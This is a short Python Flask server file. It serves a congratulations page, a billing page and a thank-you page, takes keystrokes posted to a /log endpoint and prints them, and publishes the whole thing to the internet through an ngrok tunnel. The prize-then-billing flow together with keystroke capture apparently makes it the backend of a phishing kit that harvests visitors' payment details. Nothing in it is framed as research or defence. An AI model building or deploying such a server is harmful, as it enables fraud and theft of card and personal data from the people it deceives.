from flask import Flask, render_template, request
from pyngrok import ngrok  # Requires pyngrok library

app = Flask(__name__)

@app.route('/')
def index():
    # Serve the main congratulations page
    return render_template('Qaseh.html')

@app.route('/billing')
def billing():
    # Serve the billing page
    return render_template('billing.html')

@app.route('/alhamduliah')
def alhamduliah():
    # Serve the thank you "alhamdulillah" page
    return render_template('alhamduliah.html')

@app.route('/log', methods=['POST'])
def log_key():
    # Log the captured key to the console
    data = request.get_json()
    if data and 'key' in data:
        print(f"Key pressed: {data['key']}")
    return '', 204

if __name__ == '__main__':
    # Start Flask server in a background thread
    port = 8080
    print("Starting Flask server...")
    public_url = ngrok.connect(port)  # Expose the server to the internet
    print(f"Public URL: {public_url}")
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=port)
